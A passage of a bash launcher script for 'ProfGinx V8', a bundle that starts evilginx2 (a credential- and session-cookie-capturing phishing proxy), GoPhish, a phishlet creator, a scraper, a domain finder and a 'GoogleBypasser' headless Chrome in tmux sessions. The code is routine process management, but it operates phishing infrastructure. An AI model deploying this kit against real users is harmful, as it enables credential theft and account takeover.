            cd "$DOMAINHUNTER_DIR"
            echo -e "${GREEN}  ✅ Native modules built${NC}"
        else
            echo -e "${RED}❌ Could not find better-sqlite3 directory!${NC}"
            return 1
        fi
    fi

    echo -e "${GREEN}🔥 Starting DomainHunterPro...${NC}"
    echo -e "${CYAN}   URL: http://<server_ip>:3000${NC}"
    echo ""
    echo -e "${YELLOW}📝 Expired domain finder tool${NC}"
    echo -e "${YELLOW}   - Find valuable expired domains${NC}"
    echo -e "${YELLOW}   - Check domain availability${NC}"
    echo -e "${YELLOW}   - SEO metrics analysis${NC}"
    echo ""

    # Use production mode if dist exists, otherwise dev mode
    if [[ -d "$DOMAINHUNTER_DIR/dist" ]]; then
        pnpm run start
    else
        pnpm run dev
    fi
}

run_all() {
    check_root "all"
    check_tmux
    check_binary "evilginx2" "$SCRIPT_DIR/evilginx2" || exit 1
    check_binary "evilfeed" "$SCRIPT_DIR/evilfeed/evilfeed" || exit 1

    # Parse arguments for -reverse flag (same logic as run_evilginx)
    shift  # Skip 'all' command
    local EXTRA_FLAGS=""
    local USE_REVERSE_PROXY=""
    local REVERSE_DOMAIN=""
    
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -reverse)
                USE_REVERSE_PROXY="$2"
                REVERSE_DOMAIN="$3"
                shift 3
                ;;
            *)
                EXTRA_FLAGS="$EXTRA_FLAGS $1"
                shift
                ;;
        esac
    done

    echo -e "${GREEN}🚀 Starting all ProfGinx V8 services in tmux...${NC}"
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        echo -e "${CYAN}   Reverse Proxy: $USE_REVERSE_PROXY (domain: $REVERSE_DOMAIN)${NC}"
    fi
    if [[ -n "$EXTRA_FLAGS" ]]; then
        echo -e "${CYAN}   Evilginx flags:$EXTRA_FLAGS${NC}"
    fi
    echo ""

    # Start Chrome headless for GoogleBypasser (before tmux session)
    start_chrome_headless
    echo ""

    # Start reverse proxy if requested (before tmux session)
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        start_reverse_proxy "$USE_REVERSE_PROXY" "$REVERSE_DOMAIN"
        # Add port flag for evilginx to run on 8443
        EXTRA_FLAGS="$EXTRA_FLAGS -p 8443"
    fi

    # Auto-configure GoPhish integration if GoPhish binary exists
    if [[ -f "$SCRIPT_DIR/gophish/gophish" ]]; then
        auto_configure_gophish
        echo ""
    fi

    # Kill existing session if exists
    tmux kill-session -t "$TMUX_SESSION" 2>/dev/null

    # Create new tmux session with evilginx
    tmux new-session -d -s "$TMUX_SESSION" -n evilginx
    tmux send-keys -t "$TMUX_SESSION:evilginx" "cd $SCRIPT_DIR && ./evilginx2 -c ./.evilginx$EXTRA_FLAGS" C-m

    # Create evilfeed window
    tmux new-window -t "$TMUX_SESSION" -n evilfeed
    tmux send-keys -t "$TMUX_SESSION:evilfeed" "cd $SCRIPT_DIR/evilfeed && ./evilfeed" C-m

    # Create gophish window (if binary exists)
    if [[ -f "$SCRIPT_DIR/gophish/gophish" ]]; then
        # Generate certs if needed (check for BOTH .crt AND .key)
        if [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.crt" ]] || [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.key" ]]; then
            openssl req -x509 -newkey rsa:2048 \
                -keyout "$SCRIPT_DIR/gophish/gophish_admin.key" \
                -out "$SCRIPT_DIR/gophish/gophish_admin.crt" \
                -days 365 -nodes -subj "/CN=gophish" 2>/dev/null
        fi
        tmux new-window -t "$TMUX_SESSION" -n gophish
        tmux send-keys -t "$TMUX_SESSION:gophish" "cd $SCRIPT_DIR/gophish && ./gophish" C-m
    fi

    # Create phishletweb window (if venv exists)
    if [[ -d "$SCRIPT_DIR/phishcreator/venv" ]]; then
        tmux new-window -t "$TMUX_SESSION" -n phishletweb
        tmux send-keys -t "$TMUX_SESSION:phishletweb" "cd $SCRIPT_DIR/phishcreator && source venv/bin/activate && PLAYWRIGHT_BROWSERS_PATH=$SCRIPT_DIR/phishcreator/.playwright python app.py" C-m
    fi

    # Create gmapscraper window (if binary or source exists)
    if [[ -f "$SCRIPT_DIR/gmapscraper/gmapscraper" ]] || [[ -f "$SCRIPT_DIR/gmapscraper/main.go" ]]; then
        tmux new-window -t "$TMUX_SESSION" -n gmapscraper
        # Build if binary doesn't exist
        if [[ ! -f "$SCRIPT_DIR/gmapscraper/gmapscraper" ]]; then
            tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && go build -o gmapscraper . && ./gmapscraper -web -addr :8081" C-m
        else
            tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && ./gmapscraper -web -addr :8081" C-m
        fi
    fi

    # Create domainhunter window (if node_modules exists or package.json exists)
    if [[ -d "$SCRIPT_DIR/domainhunterpro/node_modules" ]] || [[ -f "$SCRIPT_DIR/domainhunterpro/package.json" ]]; then
        tmux new-window -t "$TMUX_SESSION" -n domainhunter
        # Build native module inline command (finds better-sqlite3 dir and runs npm build)
        local BUILD_CMD="SQLDIR=\$(find node_modules/.pnpm -type d -name 'better-sqlite3' -path '*better-sqlite3@*/node_modules/*' 2>/dev/null | head -1) && cd \$SQLDIR && npm run build-release && cd $SCRIPT_DIR/domainhunterpro"
        # Install deps if node_modules doesn't exist
        if [[ ! -d "$SCRIPT_DIR/domainhunterpro/node_modules" ]]; then
            tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && pnpm install && $BUILD_CMD && pnpm run dev" C-m
        elif [[ -d "$SCRIPT_DIR/domainhunterpro/dist" ]]; then
            # Check if native module exists, build if not, then start
            tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run start" C-m
        else
            tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run dev" C-m
        fi
    fi

    echo -e "${GREEN}✅ All services started in tmux session '${TMUX_SESSION}'${NC}"
    echo ""
    echo -e "${CYAN}To attach to the session:${NC}"
    echo "  tmux attach -t $TMUX_SESSION"
    echo ""
    echo -e "${CYAN}To switch between windows:${NC}"
    echo "  Ctrl+B then 0 = Evilginx2"
    echo "  Ctrl+B then 1 = EvilFeed"
    echo "  Ctrl+B then 2 = GoPhish"
    echo "  Ctrl+B then 3 = PhishCreator"
    echo "  Ctrl+B then 4 = GMaps Scraper"
    echo "  Ctrl+B then 5 = DomainHunterPro"
    echo ""
    echo -e "${CYAN}To detach (leave running):${NC}"
    echo "  Ctrl+B then D"
    echo ""
    echo -e "${CYAN}Service URLs:${NC}"
    echo "  EvilFeed Dashboard: http://<server_ip>:1337"
    echo "  GoPhish Admin:      https://<server_ip>:3333"
    echo "  PhishCreator:       http://<server_ip>:5050"
    echo "  GMaps Scraper:      http://<server_ip>:8081"
    echo "  DomainHunterPro:    http://<server_ip>:3000"
    echo ""
    echo -e "${YELLOW}NOTE: Check each service's terminal for auto-generated passwords!${NC}"
    echo ""

    # Attach to session
    tmux attach -t "$TMUX_SESSION"
}

# ============================================
# CUSTOM SERVICE COMBINATION
# ============================================

run_custom() {
    local SERVICES=()
    local EVILGINX_FLAGS=""
    local NEEDS_ROOT=false
    local WINDOW_NUM=0
    local USE_REVERSE_PROXY=""
    local REVERSE_DOMAIN=""

    # Parse arguments - separate services from flags
    local args=("$@")
    local i=0
    while [[ $i -lt ${#args[@]} ]]; do
        local arg="${args[$i]}"
        case "$arg" in
            evilginx)
                SERVICES+=("evilginx")
                NEEDS_ROOT=true
                ;;
            evilfeed)
                SERVICES+=("evilfeed")
                ;;
            gophish)
                SERVICES+=("gophish")
                ;;
            phishletweb)
                SERVICES+=("phishletweb")
                ;;
            gmapscraper)
                SERVICES+=("gmapscraper")
                ;;
            domainhunter)
                SERVICES+=("domainhunter")
                ;;
            -reverse)
                # Handle -reverse proxy_type domain
                USE_REVERSE_PROXY="${args[$((i+1))]}"
                REVERSE_DOMAIN="${args[$((i+2))]}"
                ((i+=2))
                ;;
            -*)
                # Collect flags for evilginx
                EVILGINX_FLAGS="$EVILGINX_FLAGS $arg"
                ;;
        esac
        ((i++))
    done

    # Validate we have services to run
    if [[ ${#SERVICES[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No valid services specified${NC}"
        echo ""
        show_usage
        exit 1
    fi

    # Check root if evilginx is requested
    if [[ "$NEEDS_ROOT" == true ]]; then
        check_root "evilginx"
    fi

    check_tmux

    # Validate binaries
    for svc in "${SERVICES[@]}"; do
        case "$svc" in
            evilginx)
                check_binary "evilginx2" "$SCRIPT_DIR/evilginx2" || exit 1
                ;;
            evilfeed)
                check_binary "evilfeed" "$SCRIPT_DIR/evilfeed/evilfeed" || exit 1
                ;;
            gophish)
                check_binary "gophish" "$SCRIPT_DIR/gophish/gophish" || exit 1
                ;;
            phishletweb)
                if [[ ! -f "$SCRIPT_DIR/phishcreator/app.py" ]] || [[ ! -d "$SCRIPT_DIR/phishcreator/venv" ]]; then
                    echo -e "${RED}❌ PhishCreator not properly setup!${NC}"
                    echo "Run: sudo ./setup.sh full"
                    exit 1
                fi
                ;;
            gmapscraper)
                # Will build if needed
                ;;
            domainhunter)
                if [[ ! -d "$SCRIPT_DIR/domainhunterpro" ]]; then
                    echo -e "${RED}❌ DomainHunterPro not found!${NC}"
                    exit 1
                fi
                ;;
        esac
    done

    echo -e "${GREEN}🚀 Starting custom service combination in tmux...${NC}"
    echo -e "${CYAN}   Services: ${SERVICES[*]}${NC}"
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        echo -e "${CYAN}   Reverse Proxy: $USE_REVERSE_PROXY (domain: $REVERSE_DOMAIN)${NC}"
    fi
    if [[ -n "$EVILGINX_FLAGS" ]]; then
        echo -e "${CYAN}   Evilginx flags:$EVILGINX_FLAGS${NC}"
    fi
    echo ""

    # Start Chrome if evilginx is in the list
    for svc in "${SERVICES[@]}"; do
        if [[ "$svc" == "evilginx" ]]; then
            start_chrome_headless
            echo ""
            break
        fi
    done

    # Start reverse proxy if requested (before tmux session)
    if [[ -n "$USE_REVERSE_PROXY" ]]; then
        start_reverse_proxy "$USE_REVERSE_PROXY" "$REVERSE_DOMAIN"
        # Add port flag for evilginx to run on 8443
        EVILGINX_FLAGS="$EVILGINX_FLAGS -p 8443"
    fi

    # Kill existing session if exists
    tmux kill-session -t "$TMUX_SESSION" 2>/dev/null

    # Create tmux session with first service
    local FIRST_SERVICE="${SERVICES[0]}"
    local FIRST_WINDOW_NAME="$FIRST_SERVICE"

    case "$FIRST_SERVICE" in
        evilginx)
            tmux new-session -d -s "$TMUX_SESSION" -n evilginx
            tmux send-keys -t "$TMUX_SESSION:evilginx" "cd $SCRIPT_DIR && ./evilginx2 -c ./.evilginx$EVILGINX_FLAGS" C-m
            ;;
        evilfeed)
            tmux new-session -d -s "$TMUX_SESSION" -n evilfeed
            tmux send-keys -t "$TMUX_SESSION:evilfeed" "cd $SCRIPT_DIR/evilfeed && ./evilfeed" C-m
            ;;
        gophish)
            # Generate certs if needed (check for BOTH .crt AND .key)
            if [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.crt" ]] || [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.key" ]]; then
                openssl req -x509 -newkey rsa:2048 \
                    -keyout "$SCRIPT_DIR/gophish/gophish_admin.key" \
                    -out "$SCRIPT_DIR/gophish/gophish_admin.crt" \
                    -days 365 -nodes -subj "/CN=gophish" 2>/dev/null
            fi
            tmux new-session -d -s "$TMUX_SESSION" -n gophish
            tmux send-keys -t "$TMUX_SESSION:gophish" "cd $SCRIPT_DIR/gophish && ./gophish" C-m
            ;;
        phishletweb)
            tmux new-session -d -s "$TMUX_SESSION" -n phishletweb
            tmux send-keys -t "$TMUX_SESSION:phishletweb" "cd $SCRIPT_DIR/phishcreator && source venv/bin/activate && PLAYWRIGHT_BROWSERS_PATH=$SCRIPT_DIR/phishcreator/.playwright python app.py" C-m
            ;;
        gmapscraper)
            tmux new-session -d -s "$TMUX_SESSION" -n gmapscraper
            if [[ ! -f "$SCRIPT_DIR/gmapscraper/gmapscraper" ]]; then
                tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && go build -o gmapscraper . && ./gmapscraper -web -addr :8081" C-m
            else
                tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && ./gmapscraper -web -addr :8081" C-m
            fi
            ;;
        domainhunter)
            tmux new-session -d -s "$TMUX_SESSION" -n domainhunter
            local BUILD_CMD="SQLDIR=\$(find node_modules/.pnpm -type d -name 'better-sqlite3' -path '*better-sqlite3@*/node_modules/*' 2>/dev/null | head -1) && cd \$SQLDIR && npm run build-release && cd $SCRIPT_DIR/domainhunterpro"
            if [[ ! -d "$SCRIPT_DIR/domainhunterpro/node_modules" ]]; then
                tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && pnpm install && $BUILD_CMD && pnpm run dev" C-m
            elif [[ -d "$SCRIPT_DIR/domainhunterpro/dist" ]]; then
                tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run start" C-m
            else
                tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run dev" C-m
            fi
            ;;
    esac

    # Add remaining services as new windows
    for ((i=1; i<${#SERVICES[@]}; i++)); do
        local svc="${SERVICES[$i]}"
        case "$svc" in
            evilginx)
                tmux new-window -t "$TMUX_SESSION" -n evilginx
                tmux send-keys -t "$TMUX_SESSION:evilginx" "cd $SCRIPT_DIR && ./evilginx2 -c ./.evilginx$EVILGINX_FLAGS" C-m
                ;;
            evilfeed)
                tmux new-window -t "$TMUX_SESSION" -n evilfeed
                tmux send-keys -t "$TMUX_SESSION:evilfeed" "cd $SCRIPT_DIR/evilfeed && ./evilfeed" C-m
                ;;
            gophish)
                # Generate certs if needed (check for BOTH .crt AND .key)
                if [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.crt" ]] || [[ ! -f "$SCRIPT_DIR/gophish/gophish_admin.key" ]]; then
                    openssl req -x509 -newkey rsa:2048 \
                        -keyout "$SCRIPT_DIR/gophish/gophish_admin.key" \
                        -out "$SCRIPT_DIR/gophish/gophish_admin.crt" \
                        -days 365 -nodes -subj "/CN=gophish" 2>/dev/null
                fi
                tmux new-window -t "$TMUX_SESSION" -n gophish
                tmux send-keys -t "$TMUX_SESSION:gophish" "cd $SCRIPT_DIR/gophish && ./gophish" C-m
                ;;
            phishletweb)
                tmux new-window -t "$TMUX_SESSION" -n phishletweb
                tmux send-keys -t "$TMUX_SESSION:phishletweb" "cd $SCRIPT_DIR/phishcreator && source venv/bin/activate && PLAYWRIGHT_BROWSERS_PATH=$SCRIPT_DIR/phishcreator/.playwright python app.py" C-m
                ;;
            gmapscraper)
                tmux new-window -t "$TMUX_SESSION" -n gmapscraper
                if [[ ! -f "$SCRIPT_DIR/gmapscraper/gmapscraper" ]]; then
                    tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && go build -o gmapscraper . && ./gmapscraper -web -addr :8081" C-m
                else
                    tmux send-keys -t "$TMUX_SESSION:gmapscraper" "cd $SCRIPT_DIR/gmapscraper && ./gmapscraper -web -addr :8081" C-m
                fi
                ;;
            domainhunter)
                tmux new-window -t "$TMUX_SESSION" -n domainhunter
                local BUILD_CMD="SQLDIR=\$(find node_modules/.pnpm -type d -name 'better-sqlite3' -path '*better-sqlite3@*/node_modules/*' 2>/dev/null | head -1) && cd \$SQLDIR && npm run build-release && cd $SCRIPT_DIR/domainhunterpro"
                if [[ ! -d "$SCRIPT_DIR/domainhunterpro/node_modules" ]]; then
                    tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && pnpm install && $BUILD_CMD && pnpm run dev" C-m
                elif [[ -d "$SCRIPT_DIR/domainhunterpro/dist" ]]; then
                    tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run start" C-m
                else
                    tmux send-keys -t "$TMUX_SESSION:domainhunter" "cd $SCRIPT_DIR/domainhunterpro && (find node_modules -name 'better_sqlite3.node' 2>/dev/null | grep -q . || ($BUILD_CMD)) && pnpm run dev" C-m
                fi
                ;;
        esac
    done

    echo -e "${GREEN}✅ Services started in tmux session '${TMUX_SESSION}'${NC}"
    echo ""
    echo -e "${CYAN}To attach to the session:${NC}"
    echo "  tmux attach -t $TMUX_SESSION"
    echo ""
    echo -e "${CYAN}To switch between windows:${NC}"
    local win_num=0
    for svc in "${SERVICES[@]}"; do
        echo "  Ctrl+B then $win_num = $svc"
        ((win_num++))
    done
    echo ""
    echo -e "${CYAN}To detach (leave running):${NC}"
    echo "  Ctrl+B then D"
    echo ""
    echo -e "${CYAN}Service URLs:${NC}"
    for svc in "${SERVICES[@]}"; do
        case "$svc" in
            evilfeed)
                echo "  EvilFeed Dashboard: http://<server_ip>:1337"
                ;;
            gophish)
                echo "  GoPhish Admin:      https://<server_ip>:3333"
                ;;
            phishletweb)
                echo "  PhishCreator:       http://<server_ip>:5050"
                ;;
            gmapscraper)
                echo "  GMaps Scraper:      http://<server_ip>:8081"
                ;;
            domainhunter)
                echo "  DomainHunterPro:    http://<server_ip>:3000"
                ;;
        esac
    done
    echo ""
    echo -e "${YELLOW}NOTE: Check each service's terminal for auto-generated passwords!${NC}"
    echo ""

    # Attach to session
    tmux attach -t "$TMUX_SESSION"
}

# Check if arguments form a custom service combination
is_custom_combination() {
    local service_count=0
    local valid_services="evilginx evilfeed gophish phishletweb gmapscraper domainhunter"

    for arg in "$@"; do
        # Skip flags
        if [[ "$arg" == -* ]]; then
            continue
        fi
        # Check if it's a known service
        if [[ " $valid_services " == *" $arg "* ]]; then
            ((service_count++))
        fi
    done

    # Return true if we have 2 or more services
    [[ $service_count -ge 2 ]]
}

# ============================================
# SERVICE MANAGEMENT
# ============================================

show_status() {
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}Service Status${NC}"
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
    echo ""

    # Check tmux session
    if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        echo -e "${GREEN}[+]${NC} tmux session '${TMUX_SESSION}': ${GREEN}Running${NC}"
        echo ""
        echo "    Windows:"
        tmux list-windows -t "$TMUX_SESSION" 2>/dev/null | while read -r line; do
            echo "      $line"
        done
        echo ""
    else
        echo -e "${YELLOW}[!]${NC} tmux session '${TMUX_SESSION}': ${YELLOW}Not running${NC}"
        echo ""
    fi

    # Check processes
    echo "Process Status:"
    if pgrep -f "evilginx2" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} evilginx2: ${GREEN}Running${NC} (PID: $(pgrep -f evilginx2 | head -1))"
    else
        echo -e "  ${YELLOW}[-]${NC} evilginx2: ${YELLOW}Not running${NC}"
    fi

    if pgrep -f "evilfeed" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} evilfeed: ${GREEN}Running${NC} (PID: $(pgrep -f evilfeed | head -1))"
    else
        echo -e "  ${YELLOW}[-]${NC} evilfeed: ${YELLOW}Not running${NC}"
    fi

    if pgrep -f "gophish" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} gophish: ${GREEN}Running${NC} (PID: $(pgrep -f gophish | head -1))"
    else
        echo -e "  ${YELLOW}[-]${NC} gophish: ${YELLOW}Not running${NC}"
    fi

    if pgrep -f "phishcreator.*app.py" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} phishcreator: ${GREEN}Running${NC} (PID: $(pgrep -f "phishcreator.*app.py" | head -1))"
    else
        echo -e "  ${YELLOW}[-]${NC} phishcreator: ${YELLOW}Not running${NC}"
    fi

    if pgrep -f "gmapscraper" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} gmapscraper: ${GREEN}Running${NC} (PID: $(pgrep -f "gmapscraper" | head -1))"
    else
        echo -e "  ${YELLOW}[-]${NC} gmapscraper: ${YELLOW}Not running${NC}"
    fi

    if pgrep -f "domainhunterpro" > /dev/null 2>&1 || pgrep -f "node.*dist/index.js" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} domainhunter: ${GREEN}Running${NC}"
    else
        echo -e "  ${YELLOW}[-]${NC} domainhunter: ${YELLOW}Not running${NC}"
    fi

    echo ""

    # Check Chrome (for GoogleBypasser)
    echo "GoogleBypasser Status:"
    if command -v google-chrome &> /dev/null || command -v google-chrome-stable &> /dev/null; then
        echo -e "  ${GREEN}[+]${NC} Chrome Binary: ${GREEN}Installed${NC}"
    else
        echo -e "  ${RED}[-]${NC} Chrome Binary: ${RED}Not installed${NC}"
        echo -e "      Run: ${YELLOW}sudo ./setup.sh full${NC} to install"
    fi

    if pgrep -f "remote-debugging-port=9222" > /dev/null 2>&1; then
        echo -e "  ${GREEN}[+]${NC} Chrome Headless: ${GREEN}Running on port 9222${NC}"
    else
        echo -e "  ${YELLOW}[-]${NC} Chrome Headless: ${YELLOW}Not running${NC}"
        echo -e "      Will auto-start with Evilginx"
    fi

    echo ""

    # Check ports
    echo "Port Status:"
    for port in 80 443 1337 3000 3333 5050 8081; do
        if command -v ss &> /dev/null; then
            if ss -tlnp 2>/dev/null | grep -q ":${port} "; then
                echo -e "  ${GREEN}[+]${NC} Port $port: ${GREEN}Listening${NC}"
            else
                echo -e "  ${YELLOW}[-]${NC} Port $port: ${YELLOW}Not listening${NC}"
            fi
        elif command -v netstat &> /dev/null; then
            if netstat -tlnp 2>/dev/null | grep -q ":${port} "; then
                echo -e "  ${GREEN}[+]${NC} Port $port: ${GREEN}Listening${NC}"
            else
                echo -e "  ${YELLOW}[-]${NC} Port $port: ${YELLOW}Not listening${NC}"
            fi
        elif command -v lsof &> /dev/null; then
            if lsof -i:$port > /dev/null 2>&1; then
                echo -e "  ${GREEN}[+]${NC} Port $port: ${GREEN}Listening${NC}"
            else
                echo -e "  ${YELLOW}[-]${NC} Port $port: ${YELLOW}Not listening${NC}"
            fi
        fi
    done

    echo ""
    echo -e "${BLUE}════════════════════════════════════════════════════════════════${NC}"
}

stop_services() {
    echo -e "${BLUE}Stopping all ProfGinx V8 services...${NC}"
    echo ""

    # Kill tmux session
    if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
        echo -e "${YELLOW}[*]${NC} Killing tmux session '${TMUX_SESSION}'..."
        tmux kill-session -t "$TMUX_SESSION" 2>/dev/null
        echo -e "${GREEN}[+]${NC} tmux session killed"
    else
        echo -e "${YELLOW}[!]${NC} No tmux session '${TMUX_SESSION}' found"
    fi

    # Kill processes
    echo -e "${YELLOW}[*]${NC} Stopping processes..."

    if pgrep -f "evilginx2" > /dev/null 2>&1; then
        pkill -9 -f "evilginx2" 2>/dev/null
        echo -e "${GREEN}[+]${NC} evilginx2 stopped"
    fi

    if pgrep -f "evilfeed" > /dev/null 2>&1; then
        pkill -9 -f "evilfeed" 2>/dev/null
        echo -e "${GREEN}[+]${NC} evilfeed stopped"
    fi

    if pgrep -f "gophish" > /dev/null 2>&1; then
        pkill -9 -f "gophish" 2>/dev/null
        echo -e "${GREEN}[+]${NC} gophish stopped"
    fi

    if pgrep -f "phishcreator.*app.py" > /dev/null 2>&1; then
        pkill -9 -f "phishcreator.*app.py" 2>/dev/null
        echo -e "${GREEN}[+]${NC} phishcreator stopped"
    fi

    if pgrep -f "gmapscraper" > /dev/null 2>&1; then
        pkill -9 -f "gmapscraper" 2>/dev/null
        echo -e "${GREEN}[+]${NC} gmapscraper stopped"
    fi

    if pgrep -f "domainhunterpro" > /dev/null 2>&1 || pgrep -f "node.*dist/index.js" > /dev/null 2>&1; then
        pkill -9 -f "domainhunterpro" 2>/dev/null
        pkill -9 -f "node.*domainhunterpro" 2>/dev/null
        echo -e "${GREEN}[+]${NC} domainhunter stopped"
    fi

    # Stop Chrome headless
    stop_chrome_headless
    
    # Stop reverse proxy (nginx/caddy)
    stop_reverse_proxy

    sleep 1
    echo ""
    echo -e "${GREEN}✅ All services stopped${NC}"
    echo ""
}

# ============================================
# MAIN ENTRY POINT
# ============================================

# First check if this is a custom service combination (2+ services listed)
if is_custom_combination "$@"; then
    run_custom "$@"
    exit 0
fi

# Otherwise handle single commands
case "${1:-help}" in
    run)
        run_evilginx "$@"
        ;;
    evilfeed)
        run_evilfeed
        ;;
    gophish)
        run_gophish
        ;;
    phishletweb)
        run_phishletweb
        ;;
    gmapscraper)
        run_gmapscraper
        ;;
    domainhunter)
        run_domainhunter
        ;;
    all)
        run_all "$@"
        ;;
    status)
        show_status
        ;;
    stop)
        stop_services
        ;;
    info)
        show_info
        ;;
    help|--help|-h|*)
        show_usage
        show_info
        ;;
esac
